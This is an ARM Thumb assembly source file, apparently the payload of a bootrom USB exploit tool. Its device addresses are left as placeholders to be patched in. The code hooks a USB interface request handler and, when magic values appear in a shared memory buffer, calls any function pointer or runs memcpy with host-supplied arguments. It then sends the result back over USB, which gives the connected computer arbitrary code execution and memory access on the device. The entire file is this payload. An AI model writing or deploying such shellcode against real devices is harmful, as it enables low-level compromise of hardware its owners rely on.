/* Copyright 2022 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
.text
.align 2

.pool
.set handle_interface_request, 0x7FFFFF0
.set insecure_memory_base,     0x7FFFFF1
.set exec_magic,               0x7FFFFF2
.set done_magic,               0x7FFFFF3
.set memc_magic,               0x7FFFFF4
.set memcpy_addr,              0x7FFFFF5
.set usb_core_do_transfer,     0x7FFFFF6

.thumb
.global _main
_main:
	ldr pc, =handle_interface_request
	b _main
	ldrh r2, [r0]
	movw r3, #0x2A1
	cmp r2, r3
	bne _main
	push {r4-r6, lr}
	sub sp, sp, #0x10
	mov r4, r0
	ldr r5, =insecure_memory_base
	movw r1, #0xFFFF
	ldrh r2, [r4, #0x2]
	cmp r1, r2
	bne _request_done
	ldrd r0, r1, [r5]
	ldr r2, =exec_magic
	cmp r0, r2
	bne _not_exec
	cmp r1, r2
	bne _not_exec
	mov r1, #0
	str r1, [r5]
	ldrd r0, r1, [r5, #0x20]
	strd r0, r1, [sp]
	ldrd r0, r1, [r5, #0x28]
	strd r0, r1, [sp, #0x8]
	ldrd r0, r1, [r5, #0x10]
	ldrd r2, r3, [r5, #0x18]
	ldr r6, [r5, #0x8]
	blx r6
	ldr r2, =done_magic
	str r0, [r5, #0x8]
	strd r2, r2, [r5]
	b _request_done
_not_exec:
	ldr r2, =memc_magic
	cmp r0, r2
	bne _request_done
	cmp r1, r2
	bne _request_done
	mov r1, #0
	strd r1, r1, [r5]
	ldrd r0, r1, [r5, #0x10]
	ldr r2, [r5, #0x18]
	ldr r3, =memcpy_addr
	blx r3
	ldr r2, =done_magic
	str r0, [r5, #0x8]
	strd r2, r2, [r5]
_request_done:
	mov r0, #0x80
	mov r1, r5
	ldrh r2, [r4, #0x6]
	mov r3, #0
	ldr r4, =usb_core_do_transfer
	blx r4
	mov r0, #0
	add sp, sp, #0x10
	pop {r4-r6, pc}
